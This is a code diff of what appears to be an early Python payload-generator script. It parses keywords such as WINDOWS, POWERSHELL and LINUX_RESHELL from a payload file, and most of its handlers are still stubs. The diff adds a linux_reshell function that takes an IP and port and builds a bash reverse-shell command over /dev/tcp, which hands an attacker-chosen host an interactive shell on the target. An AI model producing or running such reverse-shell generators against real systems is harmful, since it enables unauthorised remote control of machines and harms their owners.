@@ -3,15 +3,16 @@ paylist = [] # 使用列表存储payload
 # payload 读取函数
 def Rpayload():
     
-    with open ('payload.txt','r') as payload:
+    with open ('payload2.txt','r') as payload:
         for line in payload:
             line = line.strip()
             
             if line == "WINDOWS":
                 win()
-                
-            elif line == "LINUX":
-                linux()
+            elif line == "LINUX_OPENSHELL":
+                linux_openshell()
+            elif line[:13] == "LINUX_RESHELL":
+                linux_reshell(line[14:])
                 
             elif line == "POWERSHELL":
                 powershell()
@@ -29,11 +30,8 @@ def Rpayload():
                 if line[:8] == "set Time":
                     time(line[9:])
                     
-                 
             print(paylist)
     return paylist
-        
-
 
 def main():
     Rpayload()
@@ -42,9 +40,9 @@ def main():
 def win():
     print("test")
 
-
-def linux():
-    print("test")
+def linux_reshell(line):
+    ip,port = line.split()
+    paylist.append(f"/bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1")
 
 def powershell():
     print("test_powershell")
@@ -56,6 +54,9 @@ def cmd():
 
 def toggleinput():
     paylist.append("toggleinput")
+
+def linux_openshell():
+    paylist.append("linux_openshell")
 
 # SET
 
